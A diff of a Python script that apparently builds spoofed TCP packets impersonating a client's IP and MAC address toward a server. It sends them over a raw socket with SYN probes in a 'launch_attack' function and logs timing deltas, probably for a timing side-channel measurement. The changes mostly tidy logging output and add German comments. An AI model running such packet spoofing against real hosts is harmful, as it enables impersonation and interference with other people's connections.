@@ -21,9 +21,9 @@ local_eth_adr = b''         #local mac
 spoofed_ip = local_ip       #client ip
 spoofed_eth_adr = b''       #client mac
 
-print("[+] Starting script...")
-print("[+] Logs can be found under logs/")
+print("[+] Starting...")
 
+#Ermittelt und konvertiert ua. MAC Adressen für die Nutzung mit dpkt
 def setup():
     global iface_name
     global local_ip
@@ -34,24 +34,20 @@ def setup():
     #get local ip and mac adress
     iface_name, local_ip, local_eth_adr = fetch_local_details()
     iface_name = "eno1"
-    print(f'[+] Auto setting interface to {iface_name}!')
-    print(f'[+] Found ip {local_ip} and mac address {local_eth_adr} for the local device')
+    print(f'[+] Interface set to {iface_name}!')
+    print(f'[+] IP {local_ip} and mac address {local_eth_adr} for the local device')
     local_eth_adr = bytes.fromhex(local_eth_adr.replace(":", " "))
 
-    #get target mac adress
-    #target_eth_adr = get_mac_for_ip(iface_name,(local_ip,local_eth_adr), target_ip)
     target_eth_adr = '34:17:eb:cb:d4:14'
-    print(f"[+] Found server ({target_ip}:{target_port}) at {target_eth_adr}")
+    print(f"[+] Server ({target_ip}:{target_port}) at {target_eth_adr}")
     target_eth_adr = bytes.fromhex(target_eth_adr.replace(":", ""))
     
-
-    #get the mac adress of the client
-    #spoofed_eth_adr = get_mac_for_ip(iface_name,(local_ip,local_eth_adr), spoofed_ip)
     spoofed_eth_adr = '2c:4d:54:d7:b4:e0'
-    print(f"[+] Found client ({spoofed_ip}) at {spoofed_eth_adr}")
+    print(f"[+] Client ({spoofed_ip}) at {spoofed_eth_adr}")
     spoofed_eth_adr = bytes.fromhex(spoofed_eth_adr.replace(":", ""))
     print("[+] Setup complete!")
 
+#Sendet die bereits erstellten Pakete in Reihenfolge
 def launch_attack(probes, sock, msNum):
     pcap = Pcap()
     pcap.activate()
@@ -63,13 +59,11 @@ def launch_attack(probes, sock, msNum):
     
     diff = timestamps[1] - timestamps[0]
     diffMs = diff*1000.0
-    #print(f"[+] Delta: {diffMs}ms")
     return diffMs
 
 def main():
     
-    #erstelle spoofed request
-     
+    #Erstelle ein Spoofed Request     
     spoofed = []
     start = 2451102470
     ack = 3228492072
@@ -104,7 +98,7 @@ def main():
     
         spoofed.append(spoofedETH)
 
-    #probes
+    #Probes
     tcpP = TCP(sport=55555, dport=target_port, flags=[dpkt.tcp.TH_SYN])
     ipP = IP((local_ip,local_eth_adr), (target_ip,target_eth_adr), tcpP.build())
     
@@ -116,16 +110,13 @@ def main():
         logFile.write("values\n")
         
         for i in range(0,100):
-
-            sys.stdout.close()
-            sys.stdout = sys.__stdout__
             print(f"[+] {i+1}/100",end="\r")
-            sys.stdout = open("logs/measure.log",'a')
             with socket.socket(socket.AF_PACKET, socket.SOCK_RAW, dpkt.ip.IP_PROTO_IP) as sock:
                 sock.bind((iface_name,1))
                 logFile.write(str(launch_attack(probes, sock,2))+"\n")
 
 if __name__ == "__main__":
+    #Fixt den Prozess auf eine bestimmte CPU
     print(f"[?] Available cpu's: {psutil.cpu_count()}" )
     p = psutil.Process()
     print(f"[?] CPU list: {p.cpu_affinity()}")
@@ -135,11 +126,8 @@ if __name__ == "__main__":
 
     setup()
     print("[+] Running...")
-    sys.stdout = open("logs/measure.log",'a')
     
     main()
     
-    sys.stdout.close()
-    sys.stdout = sys.__stdout__
     print("\n") 
     print("[+] Done!")
